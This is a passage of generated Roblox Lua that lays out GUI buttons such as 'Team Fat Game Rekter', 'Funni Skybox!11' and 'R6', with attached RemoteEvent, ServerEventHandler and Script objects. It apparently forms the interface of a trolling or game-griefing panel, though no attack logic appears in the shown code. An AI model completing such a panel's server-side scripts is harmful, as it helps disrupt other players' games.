G2L["109"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["109"].Active = false
G2L["109"].AnchorPoint = Vector2.new(0, 0)
G2L["109"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["109"].BackgroundTransparency = 1
G2L["109"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["109"].BorderSizePixel = 1
G2L["109"].ClipsDescendants = false
G2L["109"].Draggable = false
G2L["109"].Position = UDim2.new(0, 0, 0, 0)
G2L["109"].Rotation = 0
G2L["109"].Selectable = false
G2L["109"].SelectionOrder = 0
G2L["109"].Size = UDim2.new(0, 0, 0, 0)
G2L["109"].Visible = true
G2L["109"].ZIndex = 10
G2L["109"].Parent = G2L["108"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.UICorner
G2L["110"].Name = [[UICorner]]
G2L["110"].CornerRadius = UDim.new(0, 10)
G2L["110"].Parent = G2L["106"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.ServerEventHandler
G2L["111"].Name = [[ServerEventHandler]]
G2L["111"].Parent = G2L["106"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.shadowHolder
G2L["112"].Name = [[shadowHolder]]
G2L["112"].Active = false
G2L["112"].AnchorPoint = Vector2.new(0, 0)
G2L["112"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["112"].BackgroundTransparency = 1
G2L["112"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["112"].BorderSizePixel = 1
G2L["112"].ClipsDescendants = false
G2L["112"].Draggable = false
G2L["112"].Position = UDim2.new(0, 0, 0, 0)
G2L["112"].Rotation = 0
G2L["112"].Selectable = false
G2L["112"].SelectionOrder = 0
G2L["112"].Size = UDim2.new(1, 0, 1, 0)
G2L["112"].Visible = true
G2L["112"].ZIndex = -1
G2L["112"].Parent = G2L["106"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.shadowHolder.umbraShadow
G2L["113"].Name = [[umbraShadow]]
G2L["113"].Image = [[rbxassetid://1316045217]]
G2L["113"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["113"].ScaleType = Enum.ScaleType.Slice
G2L["113"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["113"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["113"].Active = false
G2L["113"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["113"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["113"].BackgroundTransparency = 1
G2L["113"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["113"].BorderSizePixel = 1
G2L["113"].ClipsDescendants = false
G2L["113"].Draggable = false
G2L["113"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["113"].Rotation = 0
G2L["113"].Selectable = false
G2L["113"].SelectionOrder = 0
G2L["113"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["113"].Visible = true
G2L["113"].ZIndex = 1
G2L["113"].Parent = G2L["112"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.shadowHolder.penumbraShadow
G2L["114"].Name = [[penumbraShadow]]
G2L["114"].Image = [[rbxassetid://1316045217]]
G2L["114"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["114"].ScaleType = Enum.ScaleType.Slice
G2L["114"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["114"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["114"].Active = false
G2L["114"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["114"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["114"].BackgroundTransparency = 1
G2L["114"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["114"].BorderSizePixel = 1
G2L["114"].ClipsDescendants = false
G2L["114"].Draggable = false
G2L["114"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["114"].Rotation = 0
G2L["114"].Selectable = false
G2L["114"].SelectionOrder = 0
G2L["114"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["114"].Visible = true
G2L["114"].ZIndex = 1
G2L["114"].Parent = G2L["112"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Funni Skybox!11.shadowHolder.ambientShadow
G2L["115"].Name = [[ambientShadow]]
G2L["115"].Image = [[rbxassetid://1316045217]]
G2L["115"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["115"].ScaleType = Enum.ScaleType.Slice
G2L["115"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["115"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["115"].Active = false
G2L["115"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["115"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["115"].BackgroundTransparency = 1
G2L["115"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["115"].BorderSizePixel = 1
G2L["115"].ClipsDescendants = false
G2L["115"].Draggable = false
G2L["115"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["115"].Rotation = 0
G2L["115"].Selectable = false
G2L["115"].SelectionOrder = 0
G2L["115"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["115"].Visible = true
G2L["115"].ZIndex = 1
G2L["115"].Parent = G2L["112"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol
G2L["116"].Name = [[Become A Furry lol]]
G2L["116"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["116"].Text = [[Become A Furry lol]]
G2L["116"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["116"].TextScaled = true
G2L["116"].TextSize = 14
G2L["116"].TextStrokeColor3 = Color3.fromRGB(255, 240.00002, 240.00002)
G2L["116"].TextStrokeTransparency = 1
G2L["116"].TextWrapped = true
G2L["116"].TextXAlignment = Enum.TextXAlignment.Center
G2L["116"].TextYAlignment = Enum.TextYAlignment.Center
G2L["116"].Active = true
G2L["116"].AnchorPoint = Vector2.new(0, 0)
G2L["116"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["116"].BackgroundTransparency = 0.5
G2L["116"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["116"].BorderSizePixel = 1
G2L["116"].ClipsDescendants = false
G2L["116"].Draggable = false
G2L["116"].Position = UDim2.new(0, 0, 0, 0)
G2L["116"].Rotation = 0
G2L["116"].Selectable = true
G2L["116"].SelectionOrder = 0
G2L["116"].Size = UDim2.new(0, 100, 0, 67)
G2L["116"].Visible = true
G2L["116"].ZIndex = 1
G2L["116"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.UICorner
G2L["117"].Name = [[UICorner]]
G2L["117"].CornerRadius = UDim.new(0, 8)
G2L["117"].Parent = G2L["116"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.TextButton_Roundify_12px
G2L["118"].Name = [[TextButton_Roundify_12px]]
G2L["118"].Image = [[rbxassetid://3570695787]]
G2L["118"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["118"].ScaleType = Enum.ScaleType.Slice
G2L["118"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["118"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["118"].Active = true
G2L["118"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["118"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["118"].BackgroundTransparency = 1
G2L["118"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["118"].BorderSizePixel = 1
G2L["118"].ClipsDescendants = false
G2L["118"].Draggable = false
G2L["118"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["118"].Rotation = 0
G2L["118"].Selectable = true
G2L["118"].SelectionOrder = 0
G2L["118"].Size = UDim2.new(1, 0, 1, 0)
G2L["118"].Visible = true
G2L["118"].ZIndex = 1
G2L["118"].Parent = G2L["116"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.shadowHolder
G2L["119"].Name = [[shadowHolder]]
G2L["119"].Active = false
G2L["119"].AnchorPoint = Vector2.new(0, 0)
G2L["119"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["119"].BackgroundTransparency = 1
G2L["119"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["119"].BorderSizePixel = 1
G2L["119"].ClipsDescendants = false
G2L["119"].Draggable = false
G2L["119"].Position = UDim2.new(0, 0, 0, 0)
G2L["119"].Rotation = 0
G2L["119"].Selectable = false
G2L["119"].SelectionOrder = 0
G2L["119"].Size = UDim2.new(1, 0, 1, 0)
G2L["119"].Visible = true
G2L["119"].ZIndex = -1
G2L["119"].Parent = G2L["116"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.shadowHolder.umbraShadow
G2L["120"].Name = [[umbraShadow]]
G2L["120"].Image = [[rbxassetid://1316045217]]
G2L["120"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["120"].ScaleType = Enum.ScaleType.Slice
G2L["120"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["120"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["120"].Active = false
G2L["120"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["120"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["120"].BackgroundTransparency = 1
G2L["120"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["120"].BorderSizePixel = 1
G2L["120"].ClipsDescendants = false
G2L["120"].Draggable = false
G2L["120"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["120"].Rotation = 0
G2L["120"].Selectable = false
G2L["120"].SelectionOrder = 0
G2L["120"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["120"].Visible = true
G2L["120"].ZIndex = 1
G2L["120"].Parent = G2L["119"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.shadowHolder.penumbraShadow
G2L["121"].Name = [[penumbraShadow]]
G2L["121"].Image = [[rbxassetid://1316045217]]
G2L["121"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["121"].ScaleType = Enum.ScaleType.Slice
G2L["121"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["121"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["121"].Active = false
G2L["121"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["121"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["121"].BackgroundTransparency = 1
G2L["121"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["121"].BorderSizePixel = 1
G2L["121"].ClipsDescendants = false
G2L["121"].Draggable = false
G2L["121"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["121"].Rotation = 0
G2L["121"].Selectable = false
G2L["121"].SelectionOrder = 0
G2L["121"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["121"].Visible = true
G2L["121"].ZIndex = 1
G2L["121"].Parent = G2L["119"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.shadowHolder.ambientShadow
G2L["122"].Name = [[ambientShadow]]
G2L["122"].Image = [[rbxassetid://1316045217]]
G2L["122"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["122"].ScaleType = Enum.ScaleType.Slice
G2L["122"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["122"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["122"].Active = false
G2L["122"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["122"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["122"].BackgroundTransparency = 1
G2L["122"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["122"].BorderSizePixel = 1
G2L["122"].ClipsDescendants = false
G2L["122"].Draggable = false
G2L["122"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["122"].Rotation = 0
G2L["122"].Selectable = false
G2L["122"].SelectionOrder = 0
G2L["122"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["122"].Visible = true
G2L["122"].ZIndex = 1
G2L["122"].Parent = G2L["119"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Become A Furry lol.Script
G2L["123"].Name = [[Script]]
G2L["123"].Parent = G2L["116"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter
G2L["124"].Name = [[Team Fat Game Rekter]]
G2L["124"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["124"].Text = [[Team Fat Game Rekter]]
G2L["124"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["124"].TextScaled = true
G2L["124"].TextSize = 14
G2L["124"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["124"].TextStrokeTransparency = 1
G2L["124"].TextWrapped = true
G2L["124"].TextXAlignment = Enum.TextXAlignment.Center
G2L["124"].TextYAlignment = Enum.TextYAlignment.Center
G2L["124"].Active = true
G2L["124"].AnchorPoint = Vector2.new(0, 0)
G2L["124"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["124"].BackgroundTransparency = 0.5
G2L["124"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["124"].BorderSizePixel = 0
G2L["124"].ClipsDescendants = false
G2L["124"].Draggable = false
G2L["124"].Position = UDim2.new(0, 0, 0, 0)
G2L["124"].Rotation = 0
G2L["124"].Selectable = true
G2L["124"].SelectionOrder = 0
G2L["124"].Size = UDim2.new(0, 200, 0, 50)
G2L["124"].Visible = true
G2L["124"].ZIndex = 1
G2L["124"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.UICorner
G2L["125"].Name = [[UICorner]]
G2L["125"].CornerRadius = UDim.new(0, 10)
G2L["125"].Parent = G2L["124"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.RippleClick
G2L["126"].Name = [[RippleClick]]
G2L["126"].Parent = G2L["124"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.RippleClick.Circle
G2L["127"].Name = [[Circle]]
G2L["127"].Image = [[rbxassetid://266543268]]
G2L["127"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["127"].ScaleType = Enum.ScaleType.Stretch
G2L["127"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["127"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["127"].Active = false
G2L["127"].AnchorPoint = Vector2.new(0, 0)
G2L["127"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["127"].BackgroundTransparency = 1
G2L["127"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["127"].BorderSizePixel = 1
G2L["127"].ClipsDescendants = false
G2L["127"].Draggable = false
G2L["127"].Position = UDim2.new(0, 0, 0, 0)
G2L["127"].Rotation = 0
G2L["127"].Selectable = false
G2L["127"].SelectionOrder = 0
G2L["127"].Size = UDim2.new(0, 0, 0, 0)
G2L["127"].Visible = true
G2L["127"].ZIndex = 10
G2L["127"].Parent = G2L["126"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.shadowHolder
G2L["128"].Name = [[shadowHolder]]
G2L["128"].Active = false
G2L["128"].AnchorPoint = Vector2.new(0, 0)
G2L["128"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["128"].BackgroundTransparency = 1
G2L["128"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["128"].BorderSizePixel = 1
G2L["128"].ClipsDescendants = false
G2L["128"].Draggable = false
G2L["128"].Position = UDim2.new(0, 0, 0, 0)
G2L["128"].Rotation = 0
G2L["128"].Selectable = false
G2L["128"].SelectionOrder = 0
G2L["128"].Size = UDim2.new(1, 0, 1, 0)
G2L["128"].Visible = true
G2L["128"].ZIndex = -1
G2L["128"].Parent = G2L["124"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.shadowHolder.umbraShadow
G2L["129"].Name = [[umbraShadow]]
G2L["129"].Image = [[rbxassetid://1316045217]]
G2L["129"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["129"].ScaleType = Enum.ScaleType.Slice
G2L["129"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["129"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["129"].Active = false
G2L["129"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["129"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["129"].BackgroundTransparency = 1
G2L["129"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["129"].BorderSizePixel = 1
G2L["129"].ClipsDescendants = false
G2L["129"].Draggable = false
G2L["129"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["129"].Rotation = 0
G2L["129"].Selectable = false
G2L["129"].SelectionOrder = 0
G2L["129"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["129"].Visible = true
G2L["129"].ZIndex = 1
G2L["129"].Parent = G2L["128"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.shadowHolder.penumbraShadow
G2L["130"].Name = [[penumbraShadow]]
G2L["130"].Image = [[rbxassetid://1316045217]]
G2L["130"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["130"].ScaleType = Enum.ScaleType.Slice
G2L["130"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["130"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["130"].Active = false
G2L["130"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["130"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["130"].BackgroundTransparency = 1
G2L["130"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["130"].BorderSizePixel = 1
G2L["130"].ClipsDescendants = false
G2L["130"].Draggable = false
G2L["130"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["130"].Rotation = 0
G2L["130"].Selectable = false
G2L["130"].SelectionOrder = 0
G2L["130"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["130"].Visible = true
G2L["130"].ZIndex = 1
G2L["130"].Parent = G2L["128"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.shadowHolder.ambientShadow
G2L["131"].Name = [[ambientShadow]]
G2L["131"].Image = [[rbxassetid://1316045217]]
G2L["131"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["131"].ScaleType = Enum.ScaleType.Slice
G2L["131"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["131"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["131"].Active = false
G2L["131"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["131"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["131"].BackgroundTransparency = 1
G2L["131"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["131"].BorderSizePixel = 1
G2L["131"].ClipsDescendants = false
G2L["131"].Draggable = false
G2L["131"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["131"].Rotation = 0
G2L["131"].Selectable = false
G2L["131"].SelectionOrder = 0
G2L["131"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["131"].Visible = true
G2L["131"].ZIndex = 1
G2L["131"].Parent = G2L["128"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.TextButton_Roundify_12px
G2L["132"].Name = [[TextButton_Roundify_12px]]
G2L["132"].Image = [[rbxassetid://3570695787]]
G2L["132"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["132"].ScaleType = Enum.ScaleType.Slice
G2L["132"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["132"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["132"].Active = true
G2L["132"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["132"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["132"].BackgroundTransparency = 1
G2L["132"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["132"].BorderSizePixel = 1
G2L["132"].ClipsDescendants = false
G2L["132"].Draggable = false
G2L["132"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["132"].Rotation = 0
G2L["132"].Selectable = true
G2L["132"].SelectionOrder = 0
G2L["132"].Size = UDim2.new(1, 0, 1, 0)
G2L["132"].Visible = true
G2L["132"].ZIndex = 1
G2L["132"].Parent = G2L["124"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Team Fat Game Rekter.ServerEventHandler
G2L["133"].Name = [[ServerEventHandler]]
G2L["133"].Parent = G2L["124"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6
G2L["134"].Name = [[R6]]
G2L["134"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["134"].Text = [[R6]]
G2L["134"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["134"].TextScaled = true
G2L["134"].TextSize = 14
G2L["134"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["134"].TextStrokeTransparency = 1
G2L["134"].TextWrapped = true
G2L["134"].TextXAlignment = Enum.TextXAlignment.Center
G2L["134"].TextYAlignment = Enum.TextYAlignment.Center
G2L["134"].Active = true
G2L["134"].AnchorPoint = Vector2.new(0, 0)
G2L["134"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["134"].BackgroundTransparency = 0.5
G2L["134"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["134"].BorderSizePixel = 0
G2L["134"].ClipsDescendants = false
G2L["134"].Draggable = false
G2L["134"].Position = UDim2.new(0, 0, 0, 0)
G2L["134"].Rotation = 0
G2L["134"].Selectable = true
G2L["134"].SelectionOrder = 0
G2L["134"].Size = UDim2.new(0, 200, 0, 50)
G2L["134"].Visible = true
G2L["134"].ZIndex = 1
G2L["134"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.TextButton_Roundify_12px
G2L["135"].Name = [[TextButton_Roundify_12px]]
G2L["135"].Image = [[rbxassetid://3570695787]]
G2L["135"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["135"].ScaleType = Enum.ScaleType.Slice
G2L["135"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["135"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["135"].Active = true
G2L["135"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["135"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["135"].BackgroundTransparency = 1
G2L["135"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["135"].BorderSizePixel = 1
G2L["135"].ClipsDescendants = false
G2L["135"].Draggable = false
G2L["135"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["135"].Rotation = 0
G2L["135"].Selectable = true
G2L["135"].SelectionOrder = 0
G2L["135"].Size = UDim2.new(1, 0, 1, 0)
G2L["135"].Visible = true
G2L["135"].ZIndex = 1
G2L["135"].Parent = G2L["134"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.RippleClick
G2L["136"].Name = [[RippleClick]]
G2L["136"].Parent = G2L["134"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.RippleClick.Circle
G2L["137"].Name = [[Circle]]
G2L["137"].Image = [[rbxassetid://266543268]]
G2L["137"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["137"].ScaleType = Enum.ScaleType.Stretch
G2L["137"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["137"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["137"].Active = false
G2L["137"].AnchorPoint = Vector2.new(0, 0)
G2L["137"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["137"].BackgroundTransparency = 1
G2L["137"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["137"].BorderSizePixel = 1
G2L["137"].ClipsDescendants = false
G2L["137"].Draggable = false
G2L["137"].Position = UDim2.new(0, 0, 0, 0)
G2L["137"].Rotation = 0
G2L["137"].Selectable = false
G2L["137"].SelectionOrder = 0
G2L["137"].Size = UDim2.new(0, 0, 0, 0)
G2L["137"].Visible = true
G2L["137"].ZIndex = 10
G2L["137"].Parent = G2L["136"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.UICorner
G2L["138"].Name = [[UICorner]]
G2L["138"].CornerRadius = UDim.new(0, 10)
G2L["138"].Parent = G2L["134"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.shadowHolder
G2L["139"].Name = [[shadowHolder]]
G2L["139"].Active = false
G2L["139"].AnchorPoint = Vector2.new(0, 0)
G2L["139"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["139"].BackgroundTransparency = 1
G2L["139"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["139"].BorderSizePixel = 1
G2L["139"].ClipsDescendants = false
G2L["139"].Draggable = false
G2L["139"].Position = UDim2.new(0, 0, 0, 0)
G2L["139"].Rotation = 0
G2L["139"].Selectable = false
G2L["139"].SelectionOrder = 0
G2L["139"].Size = UDim2.new(1, 0, 1, 0)
G2L["139"].Visible = true
G2L["139"].ZIndex = -1
G2L["139"].Parent = G2L["134"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.shadowHolder.umbraShadow
G2L["140"].Name = [[umbraShadow]]
G2L["140"].Image = [[rbxassetid://1316045217]]
G2L["140"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["140"].ScaleType = Enum.ScaleType.Slice
G2L["140"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["140"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["140"].Active = false
G2L["140"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["140"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["140"].BackgroundTransparency = 1
G2L["140"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["140"].BorderSizePixel = 1
G2L["140"].ClipsDescendants = false
G2L["140"].Draggable = false
G2L["140"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["140"].Rotation = 0
G2L["140"].Selectable = false
G2L["140"].SelectionOrder = 0
G2L["140"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["140"].Visible = true
G2L["140"].ZIndex = 1
G2L["140"].Parent = G2L["139"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.shadowHolder.penumbraShadow
G2L["141"].Name = [[penumbraShadow]]
G2L["141"].Image = [[rbxassetid://1316045217]]
G2L["141"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["141"].ScaleType = Enum.ScaleType.Slice
G2L["141"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["141"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["141"].Active = false
G2L["141"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["141"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["141"].BackgroundTransparency = 1
G2L["141"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["141"].BorderSizePixel = 1
G2L["141"].ClipsDescendants = false
G2L["141"].Draggable = false
G2L["141"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["141"].Rotation = 0
G2L["141"].Selectable = false
G2L["141"].SelectionOrder = 0
G2L["141"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["141"].Visible = true
G2L["141"].ZIndex = 1
G2L["141"].Parent = G2L["139"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.shadowHolder.ambientShadow
G2L["142"].Name = [[ambientShadow]]
G2L["142"].Image = [[rbxassetid://1316045217]]
G2L["142"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["142"].ScaleType = Enum.ScaleType.Slice
G2L["142"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["142"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["142"].Active = false
G2L["142"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["142"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["142"].BackgroundTransparency = 1
G2L["142"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["142"].BorderSizePixel = 1
G2L["142"].ClipsDescendants = false
G2L["142"].Draggable = false
G2L["142"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["142"].Rotation = 0
G2L["142"].Selectable = false
G2L["142"].SelectionOrder = 0
G2L["142"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["142"].Visible = true
G2L["142"].ZIndex = 1
G2L["142"].Parent = G2L["139"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.RemoteEvent
G2L["143"].Name = [[RemoteEvent]]
G2L["143"].Parent = G2L["134"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.R6.Script
G2L["144"].Name = [[Script]]
G2L["144"].Parent = G2L["134"]

